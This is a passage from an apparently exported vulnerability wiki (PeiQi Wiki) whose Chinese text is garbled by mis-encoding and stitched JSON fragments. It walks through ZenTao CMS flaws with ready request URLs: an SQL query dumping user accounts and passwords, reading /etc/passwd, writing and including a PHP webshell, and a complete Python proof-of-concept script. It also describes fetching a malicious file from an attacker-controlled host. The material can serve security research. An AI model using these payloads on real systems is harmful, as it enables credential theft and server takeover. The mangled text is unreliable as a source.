è¿™é‡Œä½¿ç”¨router::createAppåˆ›å»ºäº†ä¸€ä¸ªAPPå¯¹è±¡ $app = router::createApp('pms', dirname(dirname(__FILE__)), 'router'); æ¥åˆ°framework/base/router.class.phpæ–‡ä»¶æŸ¥çœ‹åˆ°createAppæ–¹æ³• public static function createApp($appName = 'demo', $appRoot = '', $className = '') { if(empty($className)) $className = __CLASS__; return new $className($appName, $appRoot); } è¿™é‡ŒNewäº†ä¸€ä¸ªå¯¹è±¡ï¼ŒæŸ¥çœ‹ä¸€ä¸‹è°ƒç”¨æ–¹æ³•(348è¡Œ) åœ¨358è¡Œå¤„è°ƒç”¨äº†setConfigRootæ–¹æ³• $this->setConfigRoot(); public function setConfigRoot() { $this->configRoot = $this->basePath . 'config' . DS; } åœ¨363è¡Œå¤„è°ƒç”¨äº†loadMainConfigæ–¹æ³• $this->loadMainConfig(); public function loadMainConfig() { /* åˆå§‹åŒ–$configå¯¹è±¡ã€‚Init the $config object. */ global $config, $filter; if(!is_object($config)) $config = new config(); $this->config = $config; /* åŠ è½½ä¸»é…ç½®æ–‡ä»¶ã€‚ Load the main config file. */ $mainConfigFile = $this->configRoot . 'config.php'; if(!file_exists($mainConfigFile)) $this->triggerError(\"The main config file $mainConfigFile not found\", __FILE__, __LINE__, $exit = true); include $mainConfigFile; } è¿™é‡ŒåŒ…å«äº†é…ç½®æ–‡ä»¶config.phpé…ç½®æ–‡ä»¶ï¼Œæ–‡ä»¶ç›®å½•ä¸º/config/config.php åœ¨25è¡Œå®šä¹‰äº†è°ƒç”¨æ–¹æ³• $config->requestType = 'PATH_INFO'; // è¯·æ±‚ç±»å‹ï¼šPATH_INFO|PATHINFO2|GETã€‚ The request type: PATH_INFO|PATH_INFO2|GET. $config->requestFix = '-'; // PATH_INFOå’ŒPATH_INFO2æ¨¡å¼çš„åˆ†éš”ç¬¦ã€‚ The divider in the url when PATH_INFO|PATH_INFO2. $config->moduleVar = 'm'; // è¯·æ±‚ç±»å‹ä¸ºGETï¼šæ¨¡å—å˜é‡åã€‚ requestType=GET: the module var name. $config->methodVar = 'f'; // è¯·æ±‚ç±»å‹ä¸ºGETï¼šæ¨¡å—å˜é‡åã€‚ requestType=GET: the method var name. $config->viewVar = 't'; // è¯·æ±‚ç±»å‹ä¸ºGETï¼šè§†å›¾å˜é‡åã€‚ requestType=GET: the view var name. $config->sessionVar = 'zentaosid'; // è¯·æ±‚ç±»å‹ä¸ºGETï¼šsessionå˜é‡åã€‚ requestType=GET: the session var name. $config->views = ',html,json,mhtml,xhtml,'; // æ”¯æŒçš„è§†å›¾ç±»å‹ã€‚ Supported view formats. å¯ä»¥å‘ç°è¿™é‡Œå­˜åœ¨ä¸¤ç§è·¯ç”±PATH_INFO|PATH_INFO2ï¼šä¸€ç§æ˜¯mã€fã€tæ¥è¿›è¡Œè°ƒç”¨ã€‚å¦å¤–ä¸€ç§æ˜¯é€šè¿‡-æ¥è¿›è¡Œè°ƒç”¨ åœ¨index.phpä¸­çš„66è¡Œ $app->parseRequest(); public function parseRequest() { if($this->config->requestType == 'PATH_INFO' or $this->config->requestType == 'PATH_INFO2') { $this->parsePathInfo(); $this->setRouteByPathInfo(); } elseif($this->config->requestType == 'GET') { $this->parseGET(); $this->setRouteByGET(); } else { $this->triggerError(\"The request type {$this->config->requestType} not supported\", __FILE__, __LINE__, $exit = true); } } çœ‹åˆ°è¿™ä¸€æ¡åˆ™æ˜¯åˆ¤æ–­åŠ›ä¸¤ç§è°ƒç”¨æ–¹æ³• $this->config->requestType == 'PATH_INFO' or $this->config->requestType == 'PATH_INFO2' è·Ÿè¿›setRouteByPathInfoæ–¹æ³• public function setRouteByPathInfo() { if(!empty($this->URI)) { /* * æ ¹æ®$requestFixåˆ†å‰²ç¬¦ï¼Œåˆ†å‰²ç½‘å€ã€‚ * There's the request seperator, split the URI by it. **/ if(strpos($this->URI, $this->config->requestFix) !== false) { $items = explode($this->config->requestFix, $this->URI); $this->setModuleName($items[0]); $this->setMethodName($items[1]); } /* * å¦‚æœç½‘å€ä¸­æ²¡æœ‰åˆ†éš”ç¬¦ï¼Œä½¿ç”¨é»˜è®¤çš„æ–¹æ³•ã€‚ * No reqeust seperator, use the default method name. **/ else { $this->setModuleName($this->URI); $this->setMethodName($this->config->default->method); } } else { $this->setModuleName($this->config->default->module); // ä½¿ç”¨é»˜è®¤æ¨¡å— use the default module. $this->setMethodName($this->config->default->method); // ä½¿ç”¨é»˜è®¤æ–¹æ³• use the default method. } $this->setControlFile(); } æ‰€ä»¥å¯ä»¥æ¨æ–­å‡ºè°ƒç”¨çš„æ–¹æ³• ä¾‹å¦‚ç™»å½•é¡µé¢æœ‰ä¸¤ç§è®¿é—®æ–¹æ³• http://xxx.xxx.xxx.xxx/index.php?m=user&f=login http://xxx.xxx.xxx.xxx/user-login.html å†çœ‹ä¸€ä¸‹checkPrivæ–¹æ³• public function checkPriv() { $module = $this->app->getModuleName(); $method = $this->app->getMethodName(); if(!empty($this->app->user->modifyPassword) and (($module != 'my' or $method != 'changepassword') and ($module != 'user' or $method != 'logout'))) die(js::locate(helper::createLink('my', 'changepassword'))); if($this->isOpenMethod($module, $method)) return true; if(!$this->loadModel('user')->isLogon() and $this->server->php_auth_user) $this->user->identifyByPhpAuth(); if(!$this->loadModel('user')->isLogon() and $this->cookie->za) $this->user->identifyByCookie(); if(isset($this->app->user)) { if(!commonModel::hasPriv($module, $method)) $this->deny($module, $method); } else { $referer = helper::safe64Encode($this->app->getURI(true)); die(js::locate(helper::createLink('user', 'login', \"referer=$referer\"))); } } è¿™é‡Œæ£€æµ‹äº†è°ƒç”¨æ¨¡å—å’Œæ–¹æ³•çš„æƒé™ï¼Œå¯ä»¥çŸ¥é“é™¤äº†isOpenMethodä¸­å®šä¹‰çš„å…¬å¼€æ¨¡å—å’Œæ–¹æ³•ä¹‹å¤–ï¼Œå…¶ä»–çš„æ–¹æ³•éƒ½æ˜¯éœ€è¦ç™»å½•çš„ æœ€åæ˜¯$app->loadModule();è¿™æ®µä»£ç  public function loadModule() { $appName = $this->appName; $moduleName = $this->moduleName; $methodName = $this->methodName; /* * å¼•å…¥è¯¥æ¨¡å—çš„controlæ–‡ä»¶ã€‚ * Include the control file of the module. **/ $file2Included = $this->setActionExtFile() ? $this->extActionFile : $this->controlFile; chdir(dirname($file2Included)); helper::import($file2Included); /* * è®¾ç½®controlçš„ç±»åã€‚ * Set the class name of the control. **/ $className = class_exists(\"my$moduleName\") ? \"my$moduleName\" : $moduleName; if(!class_exists($className)) $this->triggerError(\"the control $className not found\", __FILE__, __LINE__, $exit = true); /* * åˆ›å»ºcontrolç±»çš„å®ä¾‹ã€‚ * Create a instance of the control. **/ $module = new $className(); if(!method_exists($module, $methodName)) $this->triggerError(\"the module $moduleName has no $methodName method\", __FILE__, __LINE__, $exit = true); $this->control = $module; /* include default value for module*/ $defaultValueFiles = glob($this->getTmpRoot() . \"defaultvalue/*.php\"); if($defaultValueFiles) foreach($defaultValueFiles as $file) include $file; /* * ä½¿ç”¨åå°„æœºåˆ¶è·å–å‡½æ•°å‚æ•°çš„é»˜è®¤å€¼ã€‚ * Get the default settings of the method to be called using the reflecting. * * */ $defaultParams = array(); $methodReflect = new reflectionMethod($className, $methodName); foreach($methodReflect->getParameters() as $param) { $name = $param->getName(); $default = '_NOT_SET'; if(isset($paramDefaultValue[$appName][$className][$methodName][$name])) { $default = $paramDefaultValue[$appName][$className][$methodName][$name]; } elseif(isset($paramDefaultValue[$className][$methodName][$name])) { $default = $paramDefaultValue[$className][$methodName][$name]; } elseif($param->isDefaultValueAvailable()) { $default = $param->getDefaultValue(); } $defaultParams[$name] = $default; } /** * æ ¹æ®PATH_INFOæˆ–è€…GETæ–¹å¼è®¾ç½®è¯·æ±‚çš„å‚æ•°ã€‚ * Set params according PATH_INFO or GET. */ if($this->config->requestType != 'GET') { $this->setParamsByPathInfo($defaultParams); } else { $this->setParamsByGET($defaultParams); } if($this->config->framework->filterParam == 2) { $_GET = validater::filterParam($_GET, 'get'); $_COOKIE = validater::filterParam($_COOKIE, 'cookie'); } /* è°ƒç”¨è¯¥æ–¹æ³• Call the method. */ call_user_func_array(array($module, $methodName), $this->params); return $module; } é€šè¿‡ä¹‹å‰è·å–çš„moduleNameåŒ…å«å¯¹åº”çš„controlç±»æ–‡ä»¶å¹¶å®ä¾‹åŒ–ï¼Œéšåè°ƒç”¨setParamsByPathInfoæ–¹æ³•ä»è·¯å¾„ä¸­è·å–æ–¹æ³•å¯¹åº”çš„å‚æ•°å€¼ï¼Œæœ€åé€šè¿‡call_user_func_arrayæ–¹æ³•è°ƒç”¨å¯¹åº”controlç±»ä¸­çš„å¯¹åº”æ–¹æ³•å¹¶èµ‹å€¼ã€‚ æˆ‘ä»¬æŸ¥çœ‹module/api/control.phpæ–‡ä»¶ä¸­çš„getModelæ–¹æ³• è¿™é‡Œé€šè¿‡call_user_func_arrayå‡½æ•°è°ƒç”¨æ‰€æœ‰çš„modelæ–‡ä»¶çš„æ‰€æœ‰æ–¹æ³•ã€‚ $result = call_user_func_array(array(&$module, $methodName), $params); å¯ä»¥çœ‹åˆ°module/api/moudel.phpä¸­çš„sqlå‡½æ•° public function sql($sql, $keyField = '') { $sql = trim($sql); if(strpos($sql, ';') !== false) $sql = substr($sql, 0, strpos($sql, ';')); a($sql); if(empty($sql)) return ''; if(stripos($sql, 'select ') !== 0) { return $this->lang->api->error->onlySelect; } else { try { $stmt = $this->dao->query($sql); if(empty($keyField)) return $stmt->fetchAll(); $rows = array(); while($row = $stmt->fetch()) $rows[$row->$keyField] = $row; return $rows; } catch(PDOException $e) { return $e->getMessage(); } } } è¿™é‡Œå¹¶æ²¡æœ‰è¿›è¡Œè¿‡æ»¤ï¼Œåªä½¿ç”¨äº†ä»£ç $sql=trim($sql)è¿‡æ»¤äº†ç©ºæ ¼ æˆ‘ä»¬çœ‹ä¸€ä¸‹è¿™é‡Œçš„è°ƒç”¨è¿™ä¸ªæ–¹æ³•éœ€è¦çš„æƒé™ è¿™é‡Œå¯ä»¥çœ‹åˆ°ä»»ä½•ç”¨æˆ·éƒ½å¯ä»¥è°ƒç”¨è¿™ä¸ªæ¨¡å—çš„æ–¹æ³•ï¼Œæ‰€ä»¥æˆ‘ä»¬ç”¨å®ƒè°ƒç”¨sqlæ–¹æ³•è¿›è¡ŒæŸ¥è¯¢(ç©ºæ ¼è½¬æ¢ä¸º+,ç»•è¿‡è¿‡æ»¤) http://xxx.xxx.xxx.xxx/api-getModel-api-sql-sql=select+account,password+from+zt_user æˆåŠŸæ‰§è¡Œsqlè¯­å¥ æ¼æ´åˆ©ç”¨POC ç™»é™†åè®¿é—® http://xxx.xxx.xxx.xxx/api-getModel-api-sql-sql=select+account,password+from+zt_user PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-05-20 23:44:41 "},"PeiQi_Wiki/CMSæ¼æ´/ç¦…é“CMS/ç¦…é“ 11.6ç‰ˆæœ¬ ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´.html":{"url":"PeiQi_Wiki/CMSæ¼æ´/ç¦…é“CMS/ç¦…é“ 11.6ç‰ˆæœ¬ ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´.html","title":"ç¦…é“ 11.6ç‰ˆæœ¬ ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´","keywords":"","body":"ç¦…é“ 11.6ç‰ˆæœ¬ ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´ æ¼æ´æè¿° ç¦…é“ 11.6 ç‰ˆæœ¬ä¸­å¯¹ç”¨æˆ·æ¥å£è°ƒç”¨æƒé™è¿‡æ»¤ä¸å®Œå–„ï¼Œå¯¼è‡´è°ƒç”¨æ¥å£æ‰§è¡ŒSQLè¯­å¥å¯¼è‡´SQLæ³¨å…¥ å½±å“ç‰ˆæœ¬ [!NOTE] ç¦…é“ 11.6 ç¯å¢ƒæ­å»º è¿™é‡Œä½¿ç”¨dockerç¯å¢ƒæ­å»º docker run --name zentao_v11.6 -p 8084:80 -v /u01/zentao/www:/app/zentaopms -v /u01/zentao/data:/var/lib/mysql -e MYSQL_ROOT_PASSWORD=123456 -d docker.io/yunwisdom/zentao:v11.6 è®¿é—® http://xxx.xxx.xxx.xxx:8084 æŒ‰æ­¥éª¤å®‰è£…å³å¯ æ¼æ´å¤ç° è¿™é‡Œé€ æˆæ¼æ´çš„åŸå› åŒæ ·æ˜¯è°ƒç”¨æ¥å£æƒé™æ— é™åˆ¶çš„åŸå›  æ¥å£å‡ºç°æ¼æ´çš„åŸå› å…·ä½“å‚è€ƒå¯ä»¥æŸ¥çœ‹ä¸Šä¸€ç¯‡ ç¦…é“ 11.6ç‰ˆæœ¬ SQLæ³¨å…¥æ¼æ´ å…³äºæ­¤æ¼æ´çš„å®Œæ•´åˆ†æ ç¬¬ä¸€ç§æ–¹æ³• æŸ¥çœ‹module/file/moudel.phpä¸‹çš„parseCSVæ–¹æ³• public function parseCSV($fileName) { $content = file_get_contents($fileName); /* Fix bug #890. */ $content = str_replace(\"\\x82\\x32\", \"\\x10\", $content); $lines = explode(\"\\n\", $content); $col = -1; $row = 0; $data = array(); foreach($lines as $line) { $line = trim($line); $markNum = substr_count($line, '\"') - substr_count($line, '\\\"'); if(substr($line, -1) != ',' and (($markNum % 2 == 1 and $col != -1) or ($markNum % 2 == 0 and substr($line, -2) != ',\"' and $col == -1))) $line .= ','; $line = str_replace(',\"\",', ',,', $line); $line = str_replace(',\"\",', ',,', $line); $line = preg_replace_callback('/(\\\"{2,})(\\,+)/U', array($this, 'removeInterference'), $line); $line = str_replace('\"\"', '\"', $line); /* if only one column then line is the data. */ if(strpos($line, ',') === false and $col == -1) { $data[$row][0] = trim($line, '\"'); } else { /* if col is not -1, then the data of column is not end. */ if($col != -1) { $pos = strpos($line, '\",'); if($pos === false) { $data[$row][$col] .= \"\\n\" . $line; $data[$row][$col] = str_replace('&comma;', ',', $data[$row][$col]); continue; } else { $data[$row][$col] .= \"\\n\" . substr($line, 0, $pos); $data[$row][$col] = trim(str_replace('&comma;', ',', $data[$row][$col])); $line = substr($line, $pos + 2); $col++; } } if($col == -1) $col = 0; /* explode cols with delimiter. */ while($line) { /* the cell has '\"', the delimiter is '\",'. */ if($line{0} == '\"') { $pos = strpos($line, '\",'); if($pos === false) { $data[$row][$col] = substr($line, 1); /* if line is not empty, then the data of cell is not end. */ if(strlen($line) >= 1) continue 2; $line = ''; } else { $data[$row][$col] = substr($line, 1, $pos - 1); $line = substr($line, $pos + 2); } $data[$row][$col] = str_replace('&comma;', ',', $data[$row][$col]); } else { /* the delimiter default is ','. */ $pos = strpos($line, ','); /* if line is not delimiter, then line is the data of cell. */ if($pos === false) { $data[$row][$col] = $line; $line = ''; } else { $data[$row][$col] = substr($line, 0, $pos); $line = substr($line, $pos + 1); } } $data[$row][$col] = trim(str_replace('&comma;', ',', $data[$row][$col])); $col++; } } $row ++; $col = -1; } return $data; } è¿™é‡Œå¯ä»¥çœ‹åˆ°ä»¥fileä¸ºæ¨¡å—åã€parseCSVä¸ºæ–¹æ³•åå»è°ƒç”¨è¯»å–æ–‡ä»¶ è¯»å–çš„æ–‡ä»¶å$filenameå‚æ•°å¯æ§ï¼Œä¾‹å¦‚è¯»å–/etc/passwd http://xxx.xxx.xxx.xxx/api-getModel-file-parseCSV-fileName=/etc/passwd [!NOTE] æ³¨æ„ä»¥ .php .txt ç»“å°¾çš„ä¼šè¢« /framework/base/router.class.phpä¸­çš„parsePathInfoæ–¹æ³• è¿‡æ»¤ ç¬¬äºŒç§æ–¹æ³• æŸ¥çœ‹module/api/moudel.phpä¸‹çš„getMethodæ–¹æ³• public function getMethod($filePath, $ext = '') { $fileName = dirname($filePath); $className = basename(dirname(dirname($filePath))); if(!class_exists($className)) helper::import($fileName); $methodName = basename($filePath); $method = new ReflectionMethod($className . $ext, $methodName); $data = new stdClass(); $data->startLine = $method->getStartLine(); $data->endLine = $method->getEndLine(); $data->comment = $method->getDocComment(); $data->parameters = $method->getParameters(); $data->className = $className; $data->methodName = $methodName; $data->fileName = $fileName; $data->post = false; $file = file($fileName); for($i = $data->startLine - 1; $i endLine; $i++) { if(strpos($file[$i], '$this->post') or strpos($file[$i], 'fixer::input') or strpos($file[$i], '$_POST')) { $data->post = true; } } return $data; } è¿™é‡Œä¸ç¬¬ä¸€ç§å¤§åŒå°å¼‚ï¼Œåªæ˜¯è°ƒç”¨äº†ä¸åŒæ¨¡å—çš„æ–¹æ³• çœ‹åˆ°$fileName = dirname($filePath);è¿™æ®µåˆ™ä¸ºè¿”å›çš„ç›®å½•å æ‰€ä»¥è¯»å–/etc/passwdåˆ™éœ€è¦å†™ä¸º/etc/passwd/1æ¥ç»•è¿‡ http://xxx.xxx.xxx.xxx/api-getModel-api-getMethod-filePath=/etc/passwd/1 PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-05-20 23:44:41 "},"PeiQi_Wiki/CMSæ¼æ´/ç¦…é“CMS/ç¦…é“ 11.6ç‰ˆæœ¬ ä»»æ„æ–‡ä»¶å†™å…¥æ¼æ´.html":{"url":"PeiQi_Wiki/CMSæ¼æ´/ç¦…é“CMS/ç¦…é“ 11.6ç‰ˆæœ¬ ä»»æ„æ–‡ä»¶å†™å…¥æ¼æ´.html","title":"ç¦…é“ 11.6ç‰ˆæœ¬ ä»»æ„æ–‡ä»¶å†™å…¥æ¼æ´","keywords":"","body":"ç¦…é“ 11.6ç‰ˆæœ¬ ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´ æ¼æ´æè¿° ç¦…é“ 11.6 ç‰ˆæœ¬ä¸­å¯¹ç”¨æˆ·æ¥å£è°ƒç”¨æƒé™è¿‡æ»¤ä¸å®Œå–„ï¼Œå¯¼è‡´è°ƒç”¨æ¥å£æ‰§è¡ŒSQLè¯­å¥å¯¼è‡´SQLæ³¨å…¥ å½±å“ç‰ˆæœ¬ [!NOTE] ç¦…é“ 11.6 ç¯å¢ƒæ­å»º è¿™é‡Œä½¿ç”¨dockerç¯å¢ƒæ­å»º docker run --name zentao_v11.6 -p 8084:80 -v /u01/zentao/www:/app/zentaopms -v /u01/zentao/data:/var/lib/mysql -e MYSQL_ROOT_PASSWORD=123456 -d docker.io/yunwisdom/zentao:v11.6 è®¿é—® http://xxx.xxx.xxx.xxx:8084 æŒ‰æ­¥éª¤å®‰è£…å³å¯ æ¼æ´å¤ç° è¿™é‡Œé€ æˆæ¼æ´çš„åŸå› åŒæ ·æ˜¯è°ƒç”¨æ¥å£æƒé™æ— é™åˆ¶çš„åŸå›  æ¥å£å‡ºç°æ¼æ´çš„åŸå› å…·ä½“å‚è€ƒå¯ä»¥æŸ¥çœ‹ä¸Šä¸€ç¯‡ ç¦…é“ 11.6ç‰ˆæœ¬ SQLæ³¨å…¥æ¼æ´ å…³äºæ­¤æ¼æ´çš„å®Œæ•´åˆ†æ æŸ¥çœ‹module/api/ediyor/moudel.phpä¸‹çš„saveæ–¹æ³• public function save($filePath) { $fileContent = $this->post->fileContent; $evils = array('eval', 'exec', 'passthru', 'proc_open', 'shell_exec', 'system', '$$', 'include', 'require', 'assert'); $gibbedEvils = array('e v a l', 'e x e c', ' p a s s t h r u', ' p r o c _ o p e n', 's h e l l _ e x e c', 's y s t e m', '$ $', 'i n c l u d e', 'r e q u i r e', 'a s s e r t'); $fileContent = str_ireplace($gibbedEvils, $evils, $fileContent); if(get_magic_quotes_gpc()) $fileContent = stripslashes($fileContent); $dirPath = dirname($filePath); $extFilePath = substr($filePath, 0, strpos($filePath, DS . 'ext' . DS) + 4); if(!is_dir($dirPath) and is_writable($extFilePath)) mkdir($dirPath, 0777, true); if(is_writable($dirPath)) { file_put_contents($filePath, $fileContent); } else { die(js::alert($this->lang->editor->notWritable . $extFilePath)); } } $filePathå‚æ•°å’Œ$fileContentå‚æ•° æˆ‘ä»¬æ˜¯å¯æ§çš„ è°ƒç”¨æ–¹æ³•å¾€ /tmpå†™å…¥ä¸€ä¸ªphpinfo() http://xxx.xxx.xxx.xxx/api-getModel-editor-save-filePath=/tmp/shell.php POST:fileContent= åœ¨åˆ©ç”¨ ç¦…é“ 11.6ç‰ˆæœ¬ ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´ ç¬¬äºŒç§æ–¹æ³•æ¥æ–‡ä»¶åŒ…å« http://xxx.xxx.xxx.xxx/api-getModel-api-getMethod-filePath=/tmp/shell/1 ä¹Ÿå¯ä»¥å†™å…¥ç½‘ç«™ç›®å½•ä¸­ å…ˆè·å–åœ°å€ http://xxx.xxx.xxx.xxx/api-getModel-editor-save-filePath=/tmp/shell POSTï¼šfileContent=');?> è®¿é—®http://xxx.xxx.xxx.xxx/api-getModel-api-getMethod-filePath=/tmp/shell/1 å¾—åˆ°ç›®å½•ä¸º /app/zentaopma/www è¯·æ±‚æ”¹ä¸º http://xxx.xxx.xxx.xxx/api-getModel-editor-save-filePath=/tmp/shell fileContent=');?> å†å»è®¿é—®http://xxx.xxx.xxx.xxx/api-getModel-api-getMethod-filePath=/tmp/shell/1åˆ™ä¼šå†ç½‘ç«™ç›®å½•ä¸‹ç”Ÿæˆ xxx.php æ–‡ä»¶ æ¼æ´åˆ©ç”¨POC #!/usr/bin/python3 #-*- coding:utf-8 -*- # author : PeiQi # from : http://wiki.peiqi.tech import base64 import requests import random import re import json import sys def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mGithub : https://github.com/PeiQi0 \\033[0m') print('+ \\033[34må…¬ä¼—å· : PeiQiæ–‡åº“ \\033[0m') print('+ \\033[34mVersion: zentao version = 11.6 \\033[0m') print('+ \\033[36mä½¿ç”¨æ ¼å¼: python3 poc.py \\033[0m') print('+ \\033[36mUrl >>> http://xxx.xxx.xxx.xxx \\033[0m') print('+ \\033[36mZentaosid >>> xxxxxxxxxxxxxx(cookieå­—æ®µ) \\033[0m') print('+------------------------------------------') def POC_1(target_url): version_url = target_url + \"/www/index.php?mode=getconfig\" headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", } try: response = requests.get(url=version_url, timeout=20, headers=headers) version = json.loads(response.text)['version'] print(\"\\033[32m[o] ç¦…é“ç‰ˆæœ¬ä¸º:{}\\033[0m\".format(version)) except Exception as e: print(\"\\033[31m[x] è·å–ç‰ˆæœ¬å¤±è´¥ \\033[0m\", e) sys.exit(0) def POC_2(target_url, zentaosid): headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", \"Cookie\": \"zentaosid={}\".format(zentaosid) } data = {\"fileContent\":\"\"} write_url = target_url + \"/api-getModel-editor-save-filePath=/tmp/test\" try: response = requests.post(url=write_url, data=data, headers=headers, timeout=10) print(\"\\033[32m[o] å°è¯•å†™å…¥phpæ–‡ä»¶... \\033[0m\") except: print(\"\\033[31m[x] å†™å…¥phpæ–‡ä»¶å¤±è´¥ \\033[0m\") sys.exit(0) def POC_3(target_url, zentaosid): headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", \"Cookie\": \"zentaosid={}\".format(zentaosid) } vuln_url = target_url + \"/api-getModel-api-getMethod-filePath=/tmp/test/1\" try: response = requests.get(url=vuln_url, headers=headers, timeout=10) if \"System\" in response.text: print(\"\\033[32m[o] æˆåŠŸå†™å…¥æ–‡ä»¶ï¼Œå­˜åœ¨æ¼æ´, è®¿é—® {}/api-getModel-api-getMethod-filePath=/tmp/test/1/ æŸ¥çœ‹ \\033[0m\".format(target_url)) else: print(\"\\033[31m[x] è¯»å–phpæ–‡ä»¶å¤±è´¥ \\033[0m\") except: print(\"\\033[31m[x] è¯»å–phpæ–‡ä»¶å¤±è´¥ \\033[0m\") if __name__ == '__main__': title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl >>> \\033[0m\")) zentaosid = str(input(\"\\033[35mZentaosid >>> \\033[0m\")) POC_1(target_url) POC_2(target_url, zentaosid) POC_3(target_url, zentaosid) PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-05-20 23:44:41 "},"PeiQi_Wiki/CMSæ¼æ´/ç¦…é“CMS/ç¦…é“ å°äº12.4.2 æ–‡ä»¶ä¸Šä¼ æ¼æ´ CNVD-C-2020-121325.html":{"url":"PeiQi_Wiki/CMSæ¼æ´/ç¦…é“CMS/ç¦…é“ å°äº12.4.2 æ–‡ä»¶ä¸Šä¼ æ¼æ´ CNVD-C-2020-121325.html","title":"ç¦…é“ å°äº12.4.2 æ–‡ä»¶ä¸Šä¼ æ¼æ´ CNVD-C-2020-121325","keywords":"","body":"ç¦…é“ å°äº12.4.2 æ–‡ä»¶ä¸Šä¼ æ¼æ´ CNVD-C-2020-121325 æ¼æ´æè¿° ç™¾åº¦äº‘å®‰å…¨å›¢é˜Ÿç›‘æµ‹åˆ°ç¦…é“å®˜æ–¹å‘å¸ƒäº†æ–‡ä»¶ä¸Šä¼ æ¼æ´çš„é£é™©é€šå‘Šï¼Œè¯¥æ¼æ´ç¼–å·ä¸ºCNVD-C-2020-121325ï¼Œæ¼æ´å½±å“ç¦…é“ å½±å“ç‰ˆæœ¬ [!NOTE] ç¦…é“ ç¯å¢ƒæ­å»º ç™¾åº¦ä¸‹12.4.2çš„ç¦…é“ç¯å¢ƒæŒ‰æ­¥éª¤å®‰è£…ä¸‹è½½å³å¯ ç¦…é“å®˜æ–¹ç½‘ç«™ è°ƒç”¨æ¥å£æŸ¥è¯¢ç‰ˆæœ¬ä¿¡æ¯ http://xxx.xxx.xxx.xxx/www/index.php?mode=getconfig æ¼æ´å¤ç° [!NOTE] æ¼æ´è§¦å‘éœ€è¦åå°æƒé™ æ ¹æ®æ¼æ´æè¿°æŸ¥çœ‹ä¿®æ”¹åçš„ä»£ç ç‰‡æ®µ ä¿®æ”¹å‰ public function downloadZipPackage($version, $link) { $decodeLink = helper::safe64Decode($link); if(preg_match('/^https?\\:\\/\\//', $decodeLink)) return false; return parent::downloadZipPackage($version, $link); } ä¿®æ”¹å public function downloadZipPackage($version, $link) { $decodeLink = helper::safe64Decode($link); if(!preg_match('/^https?\\:\\/\\//', $decodeLink)) return false; $file = basename($link); $extension = substr($file, strrpos($file, '.') + 1); if(strpos(\",{$this->config->file->allowed},\", \",{$extension},\") === false) return false; return parent::downloadZipPackage($version, $link); } è¿™é‡Œä¼ å…¥çš„å‚æ•°ä¸ºç‰ˆæœ¬å’Œlinkåœ°å€ï¼Œç„¶åbase64è§£ç ï¼Œæ­£åˆ™åˆ¤æ–­æ˜¯å¦ä¸ºhttpæˆ–httpsåè®®ï¼Œè¿™é‡Œçš„æ­£åˆ™è¿‡æ»¤å¹¶ä¸å®Œæ•´ï¼Œæ‰€ä»¥å¯ä»¥ç»•è¿‡ç”¨äºä¸‹è½½æ¶æ„æ–‡ä»¶ å¯ä»¥å¤§å†™httpæˆ–è¯·æ±‚FTPæ¥ç»•è¿‡æ­£åˆ™ è·Ÿè¿›ä¸€ä¸‹parent::downloadZipPackageè¿™ä¸ªæ–¹æ³•ï¼Œè·Ÿç€æ¥åˆ°zentao\\module\\client\\model.phpæ–‡ä»¶ä¸­ public function downloadZipPackage($version, $link) { ignore_user_abort(true); set_time_limit(0); if(empty($version) || empty($link)) return false; $dir = \"data/client/\" . $version . '/'; $link = helper::safe64Decode($link); $file = basename($link); if(!is_dir($this->app->wwwRoot . $dir)) { mkdir($this->app->wwwRoot . $dir, 0755, true); } if(!is_dir($this->app->wwwRoot . $dir)) return false; if(file_exists($this->app->wwwRoot . $dir . $file)) { return commonModel::getSysURL() . $this->config->webRoot . $dir . $file; } ob_clean(); ob_end_flush(); $local = fopen($this->app->wwwRoot . $dir . $file, 'w'); $remote = fopen($link, 'rb'); if($remote === false) return false; while(!feof($remote)) { $buffer = fread($remote, 4096); fwrite($local, $buffer); } fclose($local); fclose($remote); return commonModel::getSysURL() . $this->config->webRoot . $dir . $file; } å¯ä»¥ç®€å•çœ‹åˆ°è¿™é‡Œè·å–linkä¼ å…¥çš„æ–‡ä»¶åï¼Œé€šè¿‡fopenæ‰“å¼€è¯¥æ–‡ä»¶ï¼Œå†™å…¥ç¦…é“ç›®å½•www/data/client/versionä¸­ æŸ¥çœ‹ä¸€ä¸‹æœ‰æ²¡æœ‰è°ƒç”¨è¿™ä¸ªæ–¹æ³•çš„åœ°æ–¹ æ‰¾åˆ°äº†downloadæ–¹æ³•è°ƒç”¨äº†è¿™ä¸ªæ¼æ´ç‚¹ï¼Œæ‰€ä»¥æˆ‘ä»¬æœ‰ä¸¤ç§ä¸‹è½½æ¶æ„æ–‡ä»¶çš„æ–¹æ³• http://xxx.xxx.xxx.xxx/www/client-download-[$versionå‚æ•°]-[base64åŠ å¯†åçš„æ¶æ„æ–‡ä»¶åœ°å€].html http://xxx.xxx.xxx.xxx/www/index.php?m=client&f=download&version=[$versionå‚æ•°]&link=[base64åŠ å¯†åçš„æ¶æ„æ–‡ä»¶åœ°å€] é¦–å…ˆå…ˆä¸Šä¼ ä¸€ä¸ªæ¶æ„æ–‡ä»¶ï¼Œå¯ä»¥æ˜¯FTPä¹Ÿå¯ä»¥æ˜¯HTTP 